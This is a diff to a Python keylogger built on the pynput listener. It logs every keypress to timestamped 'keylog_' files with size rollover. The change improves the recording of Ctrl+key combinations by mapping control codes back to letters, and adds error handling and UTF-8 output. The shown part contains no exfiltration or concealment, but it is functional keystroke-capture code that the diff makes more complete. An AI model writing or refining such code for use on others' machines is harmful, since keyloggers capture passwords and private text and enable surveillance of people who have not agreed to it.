@@ -20,14 +20,12 @@ def get_new_log_filename():
     timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
     return os.path.join(LOG_DIR, f"keylog_{timestamp}.txt")
 log_filename = get_new_log_filename()
-logging.basicConfig(filename=log_filename, level=logging.DEBUG, format="%(asctime)s - %(message)s")
+logging.basicConfig(filename=log_filename, level=logging.DEBUG, format="%(asctime)s - %(message)s", encoding='utf-8')
 
 pressed_keys = set()
 
 def on_press(key):
-    """Logs the pressed keys including key combinations like Ctrl + key."""
     try:
-        # Handle Ctrl + Key combinations
         if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
             pressed_keys.add('ctrl')
         elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
@@ -35,10 +33,21 @@ def on_press(key):
         elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
             pressed_keys.add('alt')
         else:
-            # Check for Ctrl + Key combinations
             if 'ctrl' in pressed_keys:
-                logging.info(f"Ctrl + {key.char if hasattr(key, 'char') else key} pressed")
-            # Handle Shift + Key combinations (e.g., Shift + Enter)
+                # FIX FOR CTRL+KEY ERROR: Try to get the vk to find the actual letter
+                if hasattr(key, 'vk') and 96 < key.vk < 123: # a-z range
+                     char = chr(key.vk).upper()
+                elif hasattr(key, 'char'):
+                     # If char is a low ASCII control code (1-26), map it back to a-z
+                     if ord(key.char) <= 26:
+                         char = chr(ord(key.char) + 64) # 1 becomes 'A'
+                     else:
+                         char = key.char
+                else:
+                     char = str(key)
+                
+                logging.info(f"Ctrl + {char} pressed")
+            
             elif 'shift' in pressed_keys and key == keyboard.Key.enter:
                 logging.info("Shift + Enter pressed")
             else:
@@ -46,6 +55,8 @@ def on_press(key):
 
     except AttributeError:
         logging.info(f"Special key pressed: {key}")
+    except Exception as e:
+        logging.error(f"Error logging key: {e}")
 
     # Check if the log file exceeds the size limit
     if os.path.getsize(log_filename) > LOG_FILE_SIZE_LIMIT:
